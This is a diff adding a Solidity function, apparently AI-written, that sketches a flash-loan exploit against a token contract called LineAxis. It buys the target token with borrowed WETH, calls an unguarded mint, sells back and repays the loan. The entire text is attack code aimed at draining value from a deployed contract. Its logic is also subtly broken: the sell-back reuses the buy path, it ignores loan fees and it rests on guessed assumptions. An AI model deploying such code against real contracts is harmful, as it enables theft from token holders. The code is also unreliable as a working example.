@@ -1,0 +1,40 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // We need to determine how to exploit the vulnerability
+    // Let's assume that valuableToken is the token we want to exploit (in this case WETH)
+    
+    // Step 1: Buy some tokens using the WETH from the flash loan
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // WETH token address
+    path[1] = token; // Target token address obtained from LineAxis contract
+    
+    // Swap WETH for the target token
+    IUniswapV2Router(uniswapRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // We can adjust this based on the output required
+        path,
+        address(this),
+        block.timestamp
+    );
+    
+    // Step 2: After obtaining the target tokens, we should utilize them
+    // e.g., we can mint more of the LineAxis token
+    ILineAxis(target).mint(address(this), 10); // Mint new tokens, assuming minting is not restricted
+
+    // Step 3: Swap back to WETH
+    IUniswapV2Router(uniswapRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        10, // The amount of tokens we're selling back
+        0,
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Final Step: Pay back the flash loan amount
+    uint256 totalDebt = amount; // debt is the total amount of flashloaned WETH we needed to pay back
+    // Transfer back the WETH to the flashloanProvider
+    IWETH(address(valuableToken)).transfer(flashloanProvider, totalDebt);
+}
+</executeExploitCode>
+```
